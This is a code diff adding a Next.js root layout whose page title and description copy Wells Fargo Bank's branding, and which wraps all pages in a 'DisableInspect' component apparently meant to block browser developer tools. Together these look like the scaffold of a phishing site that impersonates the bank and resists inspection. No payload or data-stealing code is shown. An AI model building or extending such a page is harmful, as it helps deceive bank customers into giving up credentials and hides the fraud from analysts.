@@ -1,0 +1,31 @@
+import "./globals.css";
+import { Geist, Geist_Mono } from "next/font/google";
+import DisableInspect from "@/components/layout/DisableInspect";
+
+const geistSans = Geist({
+  variable: "--font-geist-sans",
+  subsets: ["latin"],
+});
+
+const geistMono = Geist_Mono({
+  variable: "--font-geist-mono",
+  subsets: ["latin"],
+});
+
+export const metadata = {
+  title: "Wells Fargo Bank | Financial Services & Online Banking",
+  description:
+    "Committed to the financial health of our customers and communities. Explore bank accounts, loans, mortgages, investing, credit cards & banking services»",
+};
+
+export default function RootLayout({ children }) {
+  return (
+    <html lang="en">
+      <body
+        className={`${geistSans.variable} ${geistMono.variable} antialiased`}
+      >
+        <DisableInspect>{children}</DisableInspect>
+      </body>
+    </html>
+  );
+}
